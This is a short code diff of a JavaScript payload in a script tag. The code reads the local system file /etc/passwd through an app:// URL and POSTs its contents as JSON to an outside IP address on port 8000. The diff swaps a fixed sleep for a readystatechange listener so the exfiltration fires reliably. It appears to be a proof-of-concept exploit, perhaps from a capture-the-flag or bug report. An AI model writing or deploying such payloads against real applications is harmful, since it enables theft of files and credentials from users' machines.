@@ -6,23 +6,24 @@ function sleep(ms) {
 var x = new XMLHttpRequest();
 x.open("GET","app://local/etc/passwd");
 x.send();
-sleep(1000)
-if(x.readyState == 4){
-console.log(x.response);
+x.addEventListener('readystatechange', function (event) {
+const { target } = event;
+if(target.readyState == 4){
+console.log(target.response);
 const xhr = new XMLHttpRequest();
 const method = "POST";
 const url = "http://35.90.246.90:8000/";
 
 const data = {
-    value: x.response
+    value: target.response
 };
 
 xhr.open(method, url);
 xhr.setRequestHeader('Content-Type', 'application/json');
 
-//xhr.addEventListener('readystatechange', function (event) {
-//});
 
 xhr.send(JSON.stringify(data));
 }
+
+});
 </script>
